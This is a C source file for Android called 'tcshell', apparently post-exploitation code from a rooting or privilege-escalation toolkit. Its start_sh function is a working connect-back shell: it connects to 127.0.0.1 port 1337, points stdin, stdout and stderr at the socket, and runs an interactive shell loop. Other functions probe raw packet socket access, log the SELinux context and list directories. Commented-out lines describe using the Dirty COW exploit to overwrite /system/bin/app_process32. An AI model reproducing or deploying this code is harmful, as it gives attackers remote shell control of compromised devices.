#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/capability.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <net/ethernet.h>
#include <cutils/properties.h>
//#include <selinux/selinux.h>
#include <dlfcn.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include "lsh.h"

#include <android/log.h>
#define ALOG(...) __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)
#define BLOG(...) __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)
#define LOG_TAG "tcshell"

void check_socket() {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if(sockfd < 0)
    {
        ALOG("Faield to create socket\n");
    } else {
        ALOG("Created a socket\n");
        close(sockfd);
    }

    sockfd = socket( AF_PACKET, SOCK_RAW, htons(ETH_P_ALL) );
    if(sockfd < 0)
    {
        ALOG("Faield to create socket\n");
    } else {
        ALOG("Created a AF_PACKET socket\n");
        close(sockfd);
    }
}


//#include "psutils.h"
//#include "dirtycow.h"
#define TMPFILE "/data/local/tmp/asdfasdf"
#define DIRTYCOWLOCATION "/data/local/tmp/dirtycow"
#define OBJ1 "/data/data/com.android.systemui/files/boot.ad"
#define OBJ2 "/data/data/com.android.systemui/files/boot.ad.image"
#define DATADIR "/data/data/com.android.systemui/files"
#define MAX_WAIT 70

int start_sh(void) {
        ALOG("setting up socket...\n");
	int i; // used for dup2 later
	int sockfd; // socket file descriptor
	socklen_t socklen; // socket-length for new connections
	
	struct sockaddr_in srv_addr; // client address
 
	srv_addr.sin_family = AF_INET; // server socket type address family = internet protocol address
	srv_addr.sin_port = htons( 1337 ); // connect-back port, converted to network byte order
	srv_addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // connect-back ip , converted to network byte order
 
	// create new TCP socket
	sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
        if(sockfd < 0) {
            ALOG("failed sockfd");
            ALOG("\t%s",strerror(errno));
            return 2;
        }
	
	// connect socket
	int rc = connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));
        if(rc < 0) {
            ALOG("failed connect");
            ALOG("\t%s",strerror(errno));
            return 2;
        }

        ALOG("was able to create socket??");
        // dup2-loop to redirect stdin(0), stdout(1) and stderr(2)
	for(i = 0; i <= 2; i++)
		dup2(sockfd, i);

        ALOG("Starting LSH");
        lsh_loop();

        close(sockfd);
        return 0;
}
	
void check_context(void) {
    typedef int (*_getcon_ptr)(char** context);
    void *handle = dlopen("libselinux.so",RTLD_LAZY);
    if (handle) {

        _getcon_ptr _getcon = dlsym(handle, "getcon");
        char *conn = 0;
        if (_getcon) {
            int ret = _getcon(&conn);
            if (ret) {
                printf("Failed getting context: %d\n",ret);
            } else  {
                ALOG("Current Context: %s",conn);
            }
        }
    }
}

int remove_fn(const char* fn) {
    int res = remove(fn);
    if (res != -1) {
        ALOG("[pass] REMOVED FILE");
        return 0;
    }
    ALOG("[erro] CAN'T REMOVE FILE %s",fn);
    return 2;
}

int checkdir(const char* d) {
    DIR *dp;
    dp = opendir(d);
    if (dp == NULL) {
        return 2;
    }
    return 0;
}

int logdir(const char* d) {
    DIR *dp;
    struct dirent *ep;
    struct stat st;
    dp = opendir(d);
    if (dp != NULL) {
        while (ep = readdir(dp)) {
            char* fullpath = 0;
            asprintf(&fullpath,"%s/%s",d,ep->d_name);
            if(fullpath) {
                stat(fullpath,&st);
                ALOG("\t%5d:%5d\t%s", st.st_uid, st.st_gid, fullpath);
            } else {
                ALOG("\tXXXXX:XXXXX\t%s", fullpath);
            }

            if (fullpath) {
                free(fullpath);
            }
        }
        closedir(dp);
    } else {
        ALOG("Cannot read/open dir %s", d);
        return 2;
    }
    return 0;
}

int main(int argc, char** argv) {
    int rc; //return code
    //rc = check_for_dirtycow();
    //if(!rc) {
    //    ALOG("[wait] Dirty Cow is running!");
    //    return 2;
    //}

    //while (!check_for_app()){
    //    ALOG("app_process parent is running :S");
    //    usleep(100);
    //}
    ALOG("free of app_process32");

    //now we can dirty cow back the process
    //ALOG("tcinfo: running dirty cow to fix app_process32?");
    //char* args[] = {"dirtycow","/system/bin/app_process32","/data/local/tmp/app_process32old",NULL};
    //int arglen = 3;
    //dirtycow(arglen,args);

    ALOG("opening sock");

    check_socket();

    start_sh();

    ALOG("###################DONE WITH TC#####################");
    return 0;
}
